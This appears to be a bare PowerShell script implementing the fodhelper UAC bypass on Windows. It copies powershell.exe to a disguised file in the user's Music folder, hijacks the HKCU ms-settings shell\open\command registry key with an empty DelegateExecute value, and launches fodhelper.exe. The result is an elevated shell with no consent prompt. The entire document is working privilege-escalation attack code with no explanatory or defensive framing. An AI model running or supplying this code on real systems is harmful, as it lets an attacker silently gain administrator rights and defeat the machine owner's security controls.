$a = $env:UserName
$b = (get-command powershell.exe).Path
$c = "C:\Users\" + $a + "\Music\a.exe"
Copy-Item $b -Destination $c
Sleep(5)

New-Item HKCU:\Software\Classes\ms-settings\shell\open\command -Value $c –Force
Sleep(5)
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Sleep(5)
C:\Windows\System32\fodhelper.exe
